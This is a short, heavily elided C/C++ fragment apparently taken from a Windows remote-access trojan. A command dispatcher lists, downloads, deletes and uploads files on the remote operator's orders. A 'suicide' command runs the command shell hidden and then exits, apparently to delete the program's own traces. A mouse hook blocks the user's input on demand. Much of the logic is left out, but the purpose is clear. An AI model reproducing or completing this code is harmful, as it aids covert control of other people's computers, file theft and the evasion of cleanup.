...
int recvfromthink()
{
	...
	if (type == 'c')//list files
	{
		...
		return listfiles(charip, directory);
	}
	...
	if (type == 'd')//(download || delete) file, 0 length deletes file
	{
		...
		return ackserveract(charip, "d1");//download
	}
	...
	if (type == 'e')//upload file
	{
		...
		return uploadfile(charip, filename);
	}
	...
	if (type == '2')//suicide
	{
		...
		if (GetEnvironmentVariable("ComSpec", szFile, MAX_PATH) != 0 && (INT)ShellExecute(0, 0, szFile, szCmd, 0, SW_HIDE))
		{
			ExitProcess(-1);
		}
...
{
	if(!mouseblock)
		return CallNextHookEx(HookMouse, nCode, wp, lp);
